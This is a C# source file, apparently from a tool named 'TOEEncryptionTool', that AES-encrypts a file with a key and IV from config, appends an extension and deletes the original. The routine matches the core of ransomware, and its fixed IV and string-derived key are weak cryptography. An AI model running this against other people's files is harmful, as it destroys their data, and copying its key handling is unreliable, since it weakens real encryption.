using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace TOEEncryptionTool
{
    internal class CryptIO
    {
        // Encrypt File
        internal static bool Cry(string file)
        {
            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    aes.Mode = CipherMode.CBC;
                    aes.Key = Encoding.UTF8.GetBytes(Config.Key);
                    aes.IV = Encoding.UTF8.GetBytes(Config.IV);
                    aes.Padding = PaddingMode.PKCS7;

                    ICryptoTransform e = aes.CreateEncryptor();

                    string encFile = file + Config.ext;

                    using (FileStream fsEn = new FileStream(file, FileMode.Open))
                    {
                        using (FileStream fsEnCrypt = new FileStream(encFile, FileMode.Create))
                        {
                            using (CryptoStream cs = new CryptoStream(fsEnCrypt, e, CryptoStreamMode.Write))
                            {
                                int data;

                                while ((data = fsEn.ReadByte()) != -1)
                                {
                                    cs.WriteByte((byte)data);
                                }
                            }
                        }
                    }
                }
            }

            catch (Exception e)
            {
                Logger.LogError("Could not encrypt file: " + e.ToString());
                return false;
            }

            return true;
        }


        //Handle Encrypt File
        internal static void EncryptFile(string file)
        {
            // If Cry function returns true then delete the original file
            if (Cry(file))
            {
                File.Delete(file);
            }

            else
            {
                Logger.LogError($"Failed to Encrypt File: {file}");
            }
        }
    }
}
